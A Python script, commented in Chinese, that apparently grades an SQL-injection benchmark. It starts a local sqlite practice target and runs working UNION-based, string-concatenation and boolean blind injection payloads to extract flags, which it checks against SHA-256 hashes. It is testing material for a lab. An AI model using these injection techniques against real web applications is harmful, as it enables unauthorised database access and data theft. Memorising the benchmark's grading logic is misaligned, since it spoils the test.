#!/usr/bin/env python3
"""SQL 注入深度基准 —— Python 侧独立机验（Go sqli_attack.go 的双语言复刻）。

不复用 Go 任何代码：纯标准库实现三族注入（UNION 列探测+sqlite_master 枚举 /
引号闭合+字符串拼接子查询 / 布尔盲注 length+逐字符二分），
对 sqli_range.py 靶场（真 sqlite3）实测，命中以 SHA-256 比对。

用法: python judge_sqli.py
"""

import hashlib
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
RANGE_PY = os.path.join(HERE, "live_target", "sqli_range.py")
BENCH = os.path.join(HERE, "sqli_benchmark.json")
PORT = "18191"

RE_FLAG = re.compile(r"flag\{[^}\x00-\x1f\x7f]{4,}\}|[A-Z][A-Z0-9]{2,15}\{[^}\x00-\x1f\x7f]{4,}\}",
                     re.IGNORECASE)


def sh(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()


def fetch(url, timeout=10):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:
            return e.code, ""
    except Exception:
        return 0, ""


def wait_ready(port, tries=100):
    for _ in range(tries):
        st, _ = fetch(f"http://127.0.0.1:{port}/", timeout=1)
        if st:
            return True
        time.sleep(0.1)
    return False


def get(base, path, param, value):
    return fetch(f"{base}{path}?{param}={urllib.parse.quote(value, safe='')}")


def exploit_union(base):
    """UNION 列探测（NULL 逐列）→ sqlite_master 枚举表名 → 提取每表 flag 列。"""
    endpoint, param = "/sqli_union/news", "id"
    # 列探测：1 UNION SELECT NULL,... 逐列加，服务端 200 即列数正确（500 是列数不匹配）
    ncols = 0
    for n in range(1, 9):
        payload = "1 UNION SELECT " + ",".join(["NULL"] * n) + " -- "
        st, body = get(base, endpoint, param, payload)
        if st == 200:
            ncols = n
            break
    if not ncols:
        return []
    # 枚举表名
    payload = ("1 UNION SELECT %s -- "
               % ",".join(["NULL"] * (ncols - 1) +
                          ["(SELECT group_concat(name) FROM sqlite_master WHERE type='table')"]))
    _, body = get(base, endpoint, param, payload)
    tables = set(re.findall(r"([A-Za-z_][A-Za-z0-9_]{2,30})", body))
    found = []
    for tbl in sorted(tables):
        for col in ("flag", "value", "data", "content"):
            payload = ("1 UNION SELECT %s -- "
                       % ",".join(["NULL"] * (ncols - 1) + [f"(SELECT {col} FROM {tbl} LIMIT 1)"]))
            _, body = get(base, endpoint, param, payload)
            found += RE_FLAG.findall(body)
    return found


def exploit_concat(base):
    """引号闭合 + || 拼接子查询把 flag 拼进输出。"""
    endpoint, param = "/sqli_error/search", "q"
    found = []
    candidates = [
        "' || (SELECT flag FROM secret) || '",
        "' || (SELECT group_concat(name) FROM sqlite_master) || '",
    ]
    # 先枚举表名再逐表拼
    _, body = get(base, endpoint, param, candidates[1])
    tables = sorted(set(re.findall(r"([a-z_]{4,30})", body)) - {"html", "body", "div", "query",
                                                                "error", "result", "news", "pre"})
    for tbl in tables:
        for col in ("flag", "value", "content"):
            candidates.append(f"' || (SELECT {col} FROM {tbl}) || '")
    for payload in candidates:
        _, body = get(base, endpoint, param, payload)
        found += RE_FLAG.findall(body)
    return found


def exploit_blind(base):
    """布尔盲注：length 探测 + 逐字符二分。"""
    endpoint, param = "/sqli_blind/check", "user"

    def ask(cond):
        payload = f"x' OR {cond} -- "
        _, body = get(base, endpoint, param, payload)
        return "user exists" in body

    found = []
    for tbl in ("blind_flag", "secret"):
        for col in ("flag", "value"):
            len_cond = f"(SELECT length({col}) FROM {tbl} LIMIT 1)"
            if not ask(f"{len_cond} > 0"):
                continue
            lo, hi = 0, 100
            while lo < hi:
                mid = (lo + hi) // 2
                if ask(f"{len_cond} > {mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            n = lo
            if n <= 0:
                continue
            chars = []
            for i in range(1, n + 1):
                a, b = 32, 127
                while a < b:
                    m = (a + b) // 2
                    if ask(f"(SELECT unicode(substr({col},{i},1)) FROM {tbl} LIMIT 1) > {m}"):
                        a = m + 1
                    else:
                        b = m
                chars.append(chr(a))
            flag = "".join(chars)
            found.append(flag)
            if RE_FLAG.search(flag):
                return found
    return found


EXPLOITERS = {
    "sqli_union": exploit_union,
    "sqli_error": exploit_concat,
    "sqli_blind": exploit_blind,
}


def main():
    if not os.path.exists(BENCH) or not os.path.exists(RANGE_PY):
        print("缺少 sqli_benchmark.json 或 sqli_range.py", file=sys.stderr)
        return 1
    doc = json.load(open(BENCH, encoding="utf-8"))["problems"]

    proc = subprocess.Popen([sys.executable, RANGE_PY, PORT],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        if not wait_ready(PORT):
            print("靶场未就绪", file=sys.stderr)
            return 1
        base = f"http://127.0.0.1:{PORT}"
        hit = 0
        for pid in sorted(doc):
            found = EXPLOITERS[pid](base)
            ok = any(sh(f) == doc[pid]["flag_sha256"] for f in found)
            hit += 1 if ok else 0
            print(f"{pid:<14} {'SHA-256 校验通过' if ok else 'MISS'}  (候选 {len(found)})")
        print(f"SQL 注入深度基准（Python 侧独立复刻）: {hit}/{len(doc)}")
        return 0 if hit == len(doc) else 1
    finally:
        proc.kill()


if __name__ == "__main__":
    sys.exit(main())
